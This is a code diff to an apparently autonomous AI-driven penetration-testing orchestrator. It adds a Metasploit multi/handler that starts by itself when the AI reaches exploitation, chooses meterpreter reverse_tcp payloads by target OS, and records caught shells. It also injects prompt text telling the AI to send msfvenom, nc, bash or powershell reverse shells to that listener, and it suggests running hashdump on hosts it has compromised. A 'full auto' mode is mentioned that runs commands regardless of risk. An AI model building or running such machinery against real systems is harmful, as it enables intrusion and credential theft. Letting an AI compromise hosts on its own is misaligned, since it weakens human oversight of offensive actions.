@@ -75,6 +75,16 @@ _STAGE_ORDER: List[str] = [
 ]
 _STAGE_INDEX: Dict[str, int] = {s: i for i, s in enumerate(_STAGE_ORDER)}
 
+# Stages at which a reverse-shell listener should already be running so any
+# session the AI catches is delivered to the monitored multi/handler.
+_EXPLOIT_STAGES = frozenset({
+    "exploitation",
+    "post_exploitation",
+    "privilege_escalation",
+    "lateral_movement",
+    "credential_reuse",
+})
+
 
 def _advance_stage(current: str, proposed: str) -> str:
     """Return the stage the session should move to.
@@ -326,6 +336,16 @@ class Session:
         # Surfaced to the AI so it pivots to post-exploitation instead of
         # re-running the same exploit (a common cause of enumeration loops).
         self.compromise_evidence: List[Dict] = []
+
+        # Auto-started Metasploit multi/handler for this engagement. When the AI
+        # reaches the exploitation stage the orchestrator spins up a managed
+        # listener and records its LHOST/LPORT/payload here so (a) the AI is told
+        # to deliver its reverse payloads to THIS listener and (b) any caught
+        # session lands in the monitored handler → shows in the Shells tab.
+        self.exploit_lhost: str = ""
+        self.exploit_lport: int = 0
+        self.exploit_payload: str = ""
+        self._auto_handler_started: bool = False
 
     def to_dict(self) -> Dict:
         """Convert session to dictionary."""
@@ -1374,6 +1394,10 @@ class Orchestrator:
             # re-running the exploit that already worked.
             _exhausted_ctx += self._compromise_context_block(session)
 
+            # Managed listener directive — route reverse shells to the monitored
+            # handler so caught sessions show up in the Shells tab.
+            _exhausted_ctx += self._handler_context_block(session)
+
             # Force-command directive — appended when recovering from an empty
             # response so the model is compelled to emit a concrete next command.
             if force_command:
@@ -1481,6 +1505,11 @@ If Target Domain is provided ({session.target_domain}), ALWAYS use the domain na
             if new_stage != session.current_stage:
                 logger.info(f"Session {session_id}: stage {session.current_stage} → {new_stage} (AI proposed: {ai_response.attack_phase})")
             session.current_stage = new_stage
+
+            # Exploitation reached → make sure a managed listener is up so any
+            # reverse shell the AI catches lands in the Shells tab.
+            if new_stage in _EXPLOIT_STAGES and not session._auto_handler_started:
+                await self._ensure_exploitation_handler(session_id)
 
             # Update status based on auto-approve setting and risk level.
             # FULL_AUTO_MODE overrides: execute everything regardless of risk.
@@ -2090,7 +2119,7 @@ Subdomains found: {len(session.discovered_subdomains)}{f' — [{", ".join(sessio
 Web apps found: {len(session.web_applications)}{f' — [{", ".join(a.get("url","") for a in session.web_applications[:5])}]' if session.web_applications else ''}
 API endpoints: {len(session.discovered_api_endpoints)}
 Auto-execution depth: {session.auto_depth_counter}/{session.max_auto_depth}
-{self._exhausted_context_block(session)}{self._compromise_context_block(session)}
+{self._exhausted_context_block(session)}{self._compromise_context_block(session)}{self._handler_context_block(session)}
 Domain rule: If Target Domain is provided ({session.target_domain}), use domain name for all web tools — never IP.
 
 {self._get_relevant_threat_intel_context(session_id)}
@@ -2130,6 +2159,11 @@ Domain rule: If Target Domain is provided ({session.target_domain}), use domain 
                 logger.info(f"Session {session_id}: stage held at {session.current_stage} (AI proposed: {ai_response.attack_phase})")
             session.current_stage = new_stage
             self._save_session_status(session_id, session)
+
+            # Exploitation reached → ensure a managed listener is up so caught
+            # reverse shells land in the Shells tab.
+            if new_stage in _EXPLOIT_STAGES and not session._auto_handler_started:
+                await self._ensure_exploitation_handler(session_id)
 
             # ANTI-LOOP GUARDRAIL ─────────────────────────────────────────────
             # Two complementary checks:
@@ -2794,6 +2828,132 @@ Domain rule: If Target Domain is provided ({session.target_domain}), use domain 
     def get_shell_sessions(self, session_id: str) -> List[Dict]:
         mgr = self._shell_managers.get(session_id)
         return mgr.all_sessions() if mgr else []
+
+    # ── Auto-handler for autonomous exploitation ──────────────────────────────
+
+    def _guess_default_payload(self, session: "Session") -> str:
+        """Pick a sensible default reverse-payload from what we know about the
+        target OS. Windows indicators (SMB/RDP/NetBIOS ports, 'windows'/'microsoft'
+        in service banners) → Windows x64 meterpreter; otherwise Linux x64."""
+        override = os.getenv("EXPLOIT_PAYLOAD", "").strip()
+        if override:
+            return override
+        hay = " ".join(
+            f"{s.get('service','')} {s.get('version','')} {s.get('port','')}"
+            for s in session.discovered_services
+        ).lower()
+        win_markers = ("windows", "microsoft", "microsoft-ds", "netbios", "msrpc",
+                       "ms-wbt-server", " 445", " 139", " 3389", " 135")
+        if any(m in f" {hay}" for m in win_markers):
+            return "windows/x64/meterpreter/reverse_tcp"
+        return "linux/x64/meterpreter/reverse_tcp"
+
+    async def _ensure_exploitation_handler(self, session_id: str) -> Optional[Dict]:
+        """Start a managed multi/handler once, when the engagement reaches the
+        exploitation phase, so the AI's reverse shells land in a monitored handler
+        (and therefore appear in the Shells tab). Idempotent per session."""
+        session = self.sessions.get(session_id)
+        if not session or session._auto_handler_started:
+            return None
+        session._auto_handler_started = True  # set first so concurrent calls no-op
+        try:
+            lhost = os.getenv("EXPLOIT_LHOST", "").strip() or get_local_ip()
+            lport = int(os.getenv("EXPLOIT_LPORT", "4444"))
+            payload = self._guess_default_payload(session)
+
+            mgr = self._get_shell_manager(session_id)
+            handler = await mgr.start_handler(
+                lhost, lport, payload,
+                on_session_opened=lambda hid, info: self._persist_shell_session(
+                    session_id, hid, info
+                ),
+            )
+            session.exploit_lhost = lhost
+            session.exploit_lport = lport
+            session.exploit_payload = payload
+
+            # Persist handler config for the Shells tab + restart recovery.
+            try:
+                conn = sqlite3.connect(self.db_path)
+                conn.execute(
+                    "INSERT OR REPLACE INTO shell_handlers "
+                    "(handler_id, session_id, lhost, lport, payload, status, started_at) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                    (handler.handler_id, session_id, lhost, lport, payload,
+                     handler.status, handler.started_at),
+                )
+                conn.commit()
+                conn.close()
+            except sqlite3.Error as e:
+                logger.warning(f"Failed to persist auto-handler to DB: {e}")
+
+            logger.info(
+                f"Session {session_id}: auto-started exploitation handler "
+                f"{handler.handler_id} at {lhost}:{lport} payload={payload}"
+            )
+            # Visible timeline entry so the operator sees the listener came up.
+            _d = {
+                "timestamp": datetime.now().isoformat(),
+                "reasoning": (
+                    f"Auto-started Metasploit multi/handler at {lhost}:{lport} "
+                    f"(payload {payload}). Exploits will deliver their reverse shell "
+                    "here; caught sessions appear in the Shells tab."
+                ),
+                "suggested_command": "",
+                "risk_level": "low",
+                "confidence": 1.0,
+                "context": "handler_started",
+            }
+            session.ai_decisions.append(_d)
+            self._save_ai_decision(session_id, _d)
+            return handler.info
+        except Exception as e:
+            logger.error(f"Failed to auto-start exploitation handler for {session_id}: {e}")
+            session._auto_handler_started = False  # allow a later retry
+            return None
+
+    def _persist_shell_session(self, session_id: str, handler_id: str,
+                               info: Dict) -> None:
+        """Callback fired by the handler monitor when a session connects. Logs it
+        to shell_sessions_log and records a compromise-evidence entry so the
+        Overview + report reflect the live foothold. Best-effort."""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            conn.execute(
+                "INSERT INTO shell_sessions_log "
+                "(shell_id, handler_id, session_id, msf_id, shell_type, target_ip, "
+                " status, opened_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (info.get("shell_id", ""), handler_id, session_id,
+                 int(info.get("msf_id", 0)), info.get("type", "shell"),
+                 info.get("target_ip", ""), info.get("status", "open"),
+                 info.get("opened_at", datetime.now().isoformat())),
+            )
+            conn.commit()
+            conn.close()
+        except sqlite3.Error as e:
+            logger.warning(f"Failed to log shell session to DB: {e}")
+
+        session = self.sessions.get(session_id)
+        if session is not None:
+            logger.warning(
+                f"Session {session_id}: LIVE {info.get('type','shell')} session "
+                f"caught from {info.get('target_ip','?')} (msf id {info.get('msf_id')}) "
+                "— now controllable from the Shells tab."
+            )
+            _d = {
+                "timestamp": datetime.now().isoformat(),
+                "reasoning": (
+                    f"LIVE SHELL CAUGHT: {info.get('type','shell')} session from "
+                    f"{info.get('target_ip','?')} landed on the managed handler. "
+                    "Control it from the Shells tab (whoami, sysinfo, hashdump, etc.)."
+                ),
+                "suggested_command": "",
+                "risk_level": "high",
+                "confidence": 1.0,
+                "context": "shell_caught",
+            }
+            session.ai_decisions.append(_d)
+            self._save_ai_decision(session_id, _d)
 
     async def run_shell_command(self, session_id: str, handler_id: str,
                                 msf_id: int, command: str) -> str:
@@ -4284,6 +4444,28 @@ Web apps: {webapps}
             + "\nThese vectors have been looped on and abandoned. Choose a DIFFERENT "
             "service, port, or technique. Do not suggest a command targeting an "
             "exhausted vector.\n"
+        )
+
+    def _handler_context_block(self, session: "Session") -> str:
+        """Tell the AI a managed listener is live and how to deliver shells to it.
+        Empty until the handler has been auto-started (exploitation stage)."""
+        if not session.exploit_lhost:
+            return ""
+        return (
+            "\n=== MANAGED PAYLOAD LISTENER (deliver your shells HERE) ===\n"
+            f"A Metasploit multi/handler is LISTENING:\n"
+            f"  LHOST   = {session.exploit_lhost}\n"
+            f"  LPORT   = {session.exploit_lport}\n"
+            f"  PAYLOAD = {session.exploit_payload}\n"
+            "When you exploit, your reverse payload MUST connect back to this "
+            "LHOST:LPORT using this payload — then the session is caught and "
+            "controllable in the Shells tab. Rules:\n"
+            f"  - msfvenom: use LHOST={session.exploit_lhost} LPORT={session.exploit_lport} "
+            f"-p {session.exploit_payload}\n"
+            "  - Metasploit exploit modules: set LHOST/LPORT/PAYLOAD to the above; do NOT "
+            "run your own multi/handler — one is already listening.\n"
+            "  - Non-msf reverse shells (nc, bash -i, powershell): point them at "
+            f"{session.exploit_lhost}:{session.exploit_lport}.\n"
         )
 
     def _compromise_context_block(self, session: "Session") -> str:
